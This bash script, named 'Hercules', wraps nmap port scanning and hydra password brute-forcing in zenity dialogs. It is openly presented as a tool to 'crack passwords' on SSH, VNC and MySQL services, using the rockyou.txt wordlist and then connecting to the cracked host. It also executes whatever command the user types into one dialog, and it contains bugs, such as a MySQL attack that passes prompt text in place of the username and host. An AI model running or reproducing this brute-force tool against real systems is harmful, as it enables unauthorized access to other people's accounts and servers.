#!/bin/bash
source DontEdit.sh

#checks if the user is connected to ssh and if they are it makes the program not work
if [ -n "$SSH_CLIENT" ]; then
    echo "Connected via SSH"
    exit 0
else
    echo "Not connected via SSH"
fi

# Function to handle cleanup on exit
cleanup() {
    echo -e "${RED}[-]${NC} EXITING SOFTWARE..."
    # Add cleanup commands here
    exit 1
}

# Function to handle Ctrl+C
ctrl_c() {
    echo ""
    cleanup
}

trap ctrl_c SIGINT

clear
total_steps=100
userName="Input Username:"
hostName="Input Hostname:"

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Check if required packages are installed
for package in "${required_packages[@]}"; do
    if ! command_exists "${package}"; then
        echo -e "ERROR: The required package ${RED}'${package}'${NC} is not installed. Please install it and try again."
        exit 1
    fi
done

# Check if the script is run with --help or -h
if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
    # Display help information
    figlet "? HELP ?"
    zenity --info --title="? HELP ?" --text="+++++++++++++++Programs used+++++++++++++++\nThis program will help you crack passwords.\nIt uses Hydra and Nmap." --width=400
    zenity --info --title="? HELP ?" --text="+++++++++++++++How to use++++++++++++++++++\nTo use the program, specify the port to scan. It will check for open ports and attempt to crack passwords." --width=400
else
    # Check if the OS matches the expected OS type
    if [[ "$OSTYPE" == "${OS}"* ]]; then

        # Function to scan ports
        Hercules() {
            figlet -f slant "Hercules"
            options_text="Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'.\nIf you want to stop the program, type 'stop'."
            service=$(zenity --entry --title "Hercules" --text "$options_text" --entry-text "")
            
            if [[  " ${exit[*]} " == *" ${service} "* ]]; then
                echo 
            else
                echo -e "[+] The port you are scanning is: ${service}"
            fi

            if [[ "$service" == "ALL" || "$service" == "all" ]]; then
                echo -e "[-] Exiting program..."
                # Scan all ports
                zenity --info --title "Hercules" --text "Scanning all ports. This may take up to 1 hour to complete." --timeout=5
                sudo nmap 127.0.0.1/24 -Pn -oN scan.txt --open

                zenity --info --title "INFO" --text "Put in Hydra first to start the script." --timeout=5
                hydraInputField="Put in Hydra first to start the script."
                GUI_HYDRA=$(zenity --entry --title "hydra" --text "$hydraInputField" --entry-text "")

                if [[ " ${exit[*]} " == *" ${GUI_HYDRA} "* ]]; then
                    zenity --info --title "Hercules" --text "Stopping program."
                    exit 1
                else
                    $GUI_HYDRA
                    exit 1
                fi
            elif [[ " ${exit[*]} " == *" ${service} "* ]]; then
                zenity --info --title "Hercules" --text "Stopping program."
                exit 1
            elif [[ "${service}" == "" ]]; then
                zenity --error --title "ERROR" --text "Please input a number into the input field."
                Hercules
            else
                zenity --info --title "Hercules" --text "Scanning port ${service}." --timeout=5
                nmap 127.0.0.1 -p "${service}" --open
            fi
        }

        # Function to collect user and host information
        RunHackingCommand() {
            # Break in the outputs of my code
            echo
            original_host=127.0.0.1
            original_port=$service

            # Check if the port is closed
            if nc -zv "${original_host}" "${original_port}" >/dev/null 2>&1; then
                echo ""
            else
                echo -e "${RED}[-]${NC} Port ${original_port} on ${original_host} is closed."
                # Optionally, you can choose to exit or handle closed port differently
                exit 1
            fi
            
            zenity --info --title="Hacking command" --text="To crack VNC(5900), leave 'Input Username' empty.\nTo crack MySQL(3306), type 'localhost' in 'Input Hostname'."
            user=$(zenity --entry --title "UserName" --text "${userName}" --entry-text "")
            host=$(zenity --entry --title "HostName" --text "${hostName}" --entry-text "")
        }

        # Function to crack VNC passwords
        RunHackingCommandWithVNC() {
            if [[ $service == 5900 || $service == "VNC" ]]; then
                if [[ $user == "" && $host == "" || $host == "" ]]; then
                    zenity --info --title="SERVICE" --text="No service specified"
                    Hercules
                else
                    # Crack VNC password
                    hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://"$host"
                    title="Connecting to ${host}"
                    Connecting_To_VNC_SERVER="Connecting to '${host}'. Please wait..."
                    zenity --info --title="${title}" --text="${Connecting_To_VNC_SERVER}"
                    sleep 5
                    title="Enter password to ${host}"
                    Connected_To_VNC_SERVER="Connected to '${host}'. Enter the password to continue..."
                    zenity --info --title="${title}" --text="${Connected_To_VNC_SERVER}"
                    open "vnc://${host}"
                    exit 1
                fi
            fi
        }

        # Function to crack SSH passwords
        RunHackingCommandWithSSH() {
            if [[ $service == 22 || $service == "SSH" ]]; then
                if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                    zenity --info --title="SERVICE" --text="No service specified"
                    Hercules
                else
                    # Crack SSH password
                    hydra -l "$user" -P rockyou.txt -t 64 -vV -o output.log -I ssh://"$host"
                    title="Connecting to ${user}"
                    Connecting_To_SSH_SERVER="Connecting to ${user}. Please wait..."
                    zenity --info --title="${title}" --text="${Connecting_To_SSH_SERVER}"
                    sleep 5
                    title="Enter password to ${user}"
                    Connected_To_SSH_SERVER="Connected to ${user}. Enter the password to continue..."
                    zenity --info --title="${title}" --text="${Connected_To_SSH_SERVER}"
                    ssh "${user}"@"${host}"
                fi
            fi
        }

        # Function to crack MySQL passwords
        RunHackingCommandWithMySQL() {
            if [[ $service == 3306 || $service == "mysql" ]]; then
                if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                    zenity --info --title="SERVICE" --text="No service specified"
                    Hercules
                else
                    # Crack MySQL password
                    hydra -l "$userName" -P rockyou.txt -t 64 -vV -o output.log -I mysql://"$hostName"
                    title="Connecting to ${user}"
                    Connecting_To_MySQL_SERVER="Connecting to ${host}. Please wait..."
                    zenity --info --title="${title}" --text="${Connecting_To_MySQL_SERVER}"
                    sleep 3
                    mysql -u "${userName}" -p -A
                fi
            fi
        }

        # Call functions in order
        Hercules
        RunHackingCommand
        RunHackingCommandWithVNC
        RunHackingCommandWithSSH
        RunHackingCommandWithMySQL
    else
        # Warning message for wrong OS
        echo "WARNING: Wrong OS. Please use the correct OS." >> ERROR.LOG
        zenity --warning --title="WRONG OS" --text="Wrong OS. Please use the correct OS."
    fi
fi